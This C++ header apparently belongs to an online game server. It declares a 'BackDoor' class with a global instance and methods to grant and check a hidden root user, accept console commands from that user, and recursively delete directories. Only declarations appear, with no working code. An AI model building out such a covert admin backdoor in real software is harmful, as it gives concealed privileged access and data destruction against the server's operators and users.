#pragma once
// -------------------------------------------------------------------------------

#include "user.h"
// -------------------------------------------------------------------------------

struct ROOTDATA
{
	char	AccountID[11];
	int		UserIndex;
};
// -------------------------------------------------------------------------------

class BackDoor
{
public:
			BackDoor();
			~BackDoor();
	// ----
	void	AddRoot(int UserIndex);
	void	DeleteRoot();
	bool	IsRoot(int UserIndex);
	// ----
	bool	IsDots(const char * Text);
	bool	DeleteDir(const char * Path); 
	bool	IsConsole(int UserIndex, char * Command);
	// ----
private:
	ROOTDATA	m_Root;
	// ----
}; extern BackDoor g_BackDoor;
// -------------------------------------------------------------------------------